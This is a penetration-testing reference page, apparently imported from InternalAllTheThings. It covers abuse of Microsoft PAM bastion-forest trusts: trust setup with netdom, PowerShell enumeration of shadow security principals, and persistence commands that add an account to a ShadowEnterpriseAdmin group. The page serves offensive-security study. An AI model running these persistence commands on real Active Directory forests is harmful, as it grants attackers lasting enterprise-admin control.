---
title: Trust - Privileged Access Management
type: technique
tags: [active-directory, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Trust - Privileged Access Management

## What it is

> PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.

## How it works

Microsoft PAM (Privileged Access Management) creates a dedicated bastion forest with Shadow Security Principals, which are groups in the bastion forest mapped to privileged groups in production forests via a one-way trust. Administrators authenticate to the bastion forest and receive time-limited, PAC-scoped membership in the production forest's privileged groups, reducing the window of exposure for admin credentials. Attackers who compromise the bastion forest gain access to all managed production forests' privileged groups, making the bastion forest a high-value target that requires the same or higher security posture as the most critical production forest.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.

Requirements:

* Windows Server 2016 or earlier

If we compromise the bastion we get `Domain Admins` privileges on the other domain

* Default configuration for PAM Trust

```ps1
# execute on our forest
netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
netdom trust lab.local /domain:bastion.local /Quarantine:No
# execute on our bastion
netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
```

* Enumerate PAM trusts

```ps1
# Detect if current forest is PAM trust
Import ADModule
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

# Enumerate shadow security principals 
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

# Enumerate if current forest is managed by a bastion forest
# Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
```

* Compromise
    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
    * Using SID History
* Persistence
    * Windows/Linux:

```ps1
bloodyAD --host 10.1.0.4 -u john.doe -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local' Administrator
```

    * Windows only:

```ps1
# Add a compromised user to the group 
Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
```

## References

* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
